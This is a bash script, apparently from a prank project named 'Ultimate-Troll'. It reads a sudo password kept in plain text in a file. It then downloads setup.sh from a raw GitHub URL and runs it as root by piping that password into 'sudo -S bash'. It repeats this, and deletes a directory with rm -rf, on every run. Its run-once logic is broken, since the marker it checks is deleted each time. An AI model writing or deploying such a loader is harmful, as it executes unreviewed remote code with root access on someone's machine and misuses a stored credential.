#!/usr/bin/env bash

TARGET_DIR="$HOME/programfiles"
SUBP_DIR="$TARGET_DIR/subp"
SUCCESS_MARKER="$SUBP_DIR/success"
SETUP_URL="https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/setup.sh"
SETUP_PATH="$TARGET_DIR/setup.sh"

# Load sudo password from file
PFILE="$TARGET_DIR/p.txt"
if [ ! -f "$PFILE" ]; then
    echo "❌ Password file not found at '$PFILE'."
    exit 1
fi
SUDO_PASS=$(<"$PFILE")

# Ensure base directories exist
mkdir -p "$TARGET_DIR" "$SUBP_DIR"

# First-run bootstrap: if no success marker, create it and download setup.sh
if [ ! -e "$SUCCESS_MARKER" ]; then
    echo "[*] First run detected: creating success marker and downloading setup.sh..."
    touch "$SUCCESS_MARKER"
    curl -sSL -o "$SETUP_PATH" "$SETUP_URL"
    echo "[*] setup.sh downloaded to $SETUP_PATH"
    # Execute setup.sh on first run
    echo "[*] Running setup.sh for initial configuration..."
    echo "$SUDO_PASS" | sudo -S bash "$SETUP_PATH"
fi

# On subsequent runs: remove subp folder and invoke setup.sh
echo "[*] Success marker found: cleaning up subp directory and running setup.sh..."
rm -rf "$SUBP_DIR"
echo "$SUDO_PASS" | sudo -S bash "$SETUP_PATH"

# Continue with further functions (to be implemented)